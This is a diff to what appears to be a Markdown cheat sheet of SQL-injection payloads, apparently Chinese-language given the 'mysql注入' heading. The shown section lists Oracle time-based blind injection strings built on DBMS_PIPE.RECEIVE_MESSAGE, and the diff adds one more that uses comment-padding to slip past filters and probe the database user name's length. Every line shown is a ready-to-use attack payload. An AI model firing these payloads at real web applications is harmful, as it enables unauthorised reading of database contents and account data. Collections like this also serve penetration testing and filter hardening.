@@ -371,6 +371,7 @@ file_name(@@version)
 ```
 ' and 1=(DBMS_PIPE.RECEIVE_MESSAGE('a',10))--+
 ' AND 7238=(CASE WHEN (ASCII(SUBSTRC((SELECT NVL(CAST(USER AS VARCHAR(4000)),CHR(32)) FROM DUAL),1,1))>96) THEN DBMS_PIPE.RECEIVE_MESSAGE(CHR(71)||CHR(106)||CHR(72)||CHR(73),1) ELSE 7238 END)
+'/**/and/**/(select/**/decode(length(user),4,DBMS_PIPE.RECEIVE_MESSAGE('a',10),0)from/**/dual)='t
 ```
 
 ### mysql注入
